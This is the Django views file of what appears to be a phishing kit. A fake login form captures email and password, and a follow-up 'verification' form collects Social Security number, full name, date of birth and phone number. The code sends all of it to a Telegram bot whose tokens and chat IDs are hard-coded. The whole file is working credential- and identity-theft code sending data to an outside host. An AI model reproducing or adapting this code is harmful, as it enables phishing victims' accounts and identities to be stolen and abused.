# app/views.py
from django.shortcuts import render,HttpResponse ,redirect
from .models import FormData
from telegram import Bot
from app.utils.telegram_utils import send_to_telegram_bot

import os
from django.core.files.uploadedfile import InMemoryUploadedFile
import io
import requests
from telegram import Bot
from telegram import Update,PhotoSize
from telegram.ext import CallbackContext
import logging


import asyncio
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = '6409462780:AAGO3CNzh0Ojyj-HGj2B1ANBB18AqzexNIY'
TELEGRAM_CHAT_ID = '6071340711'

async def send_to_telegram_async(email, password):
    message = f"Form submitted:\nEmail: {email}\nPassword: {password}"

    try:
        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        
        # Log before sending the message
        logging.info("About to send message to Telegram.")
        
        await bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message )
        
        # Log after sending the message
        logging.info("Message sent to Telegram successfully.")
    except Exception as e:
        # Log any exceptions that occur
        logging.error(f"Error sending message to Telegram: {e}")

# Example usage in your view
        '''
async def verification(request):
    if request.method == 'POST':
        ssn = request.POST.get('ssn')
        full_name = request.POST.get('fullName')
        dob = request.POST.get('dob')
        phone_number = request.POST.get('phoneNumber')
        

        # Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
        bot_token = '6671002478:AAFE7kL6WfykJFWeGP9Z1hd2o7APL7vkomw'
        # Replace 'YOUR_TELEGRAM_CHAT_ID' with your actual Telegram chat ID
        chat_id = '1666996815'

        # Log before calling the function
        logging.info("About to call send_to_telegram_bot function.")
        
        # Send data to Telegram bot
        await send_to_telegram_bot(
    bot_token, chat_id, ssn, full_name, dob, phone_number,
)

        # Log after calling the function
        logging.info("Function send_to_telegram_bot called successfully.")
        
        return HttpResponse("Form submitted successfully and sent to Telegram bot!")

    return render(request, 'adding.html')


from django.http import HttpResponse
from .utils.telegram_utils import send_to_telegram_bot
'''
from app.utils.telegram_utils import send_to_telegram_bot

import time

async def verification(request):
    if request.method == 'POST':
        ssn = request.POST.get('ssn')
        full_name = request.POST.get('fullName')
        dob = request.POST.get('dob')
        phone_number = request.POST.get('phoneNumber')
        
        bot_token = '6409462780:AAGO3CNzh0Ojyj-HGj2B1ANBB18AqzexNIY'
        chat_id = '6071340711'

        try:
            # Call the async function to send the message to Telegram
            await send_to_telegram_bot(bot_token, chat_id, ssn, full_name, dob, phone_number)
            return redirect('success')  # Redirect to success page if message sent successfully
        except Exception as e:
            return HttpResponse(f"Error sending data to Telegram bot: ")

    return render(request, 'adding.html')



def index(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        

        print(f"Email: {email}")
        print(f"Password: {password}")
        

        # Run the asynchronous function in an event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_to_telegram_async(email, password))

        # Redirect to 'adding.html' with the form data as URL parameters
        return redirect('verification')
    else:
        return render(request, 'index.html')
def adding(request):
    email = request.GET.get('email')
    password = request.GET.get('password')
    

    # Your 'adding' view logic here
    return render(request, 'adding.html', {'email': email, 'password': password})

def success(request):
    
  
    

    # Your 'adding' view logic here
    return render(request, 'success.html',)
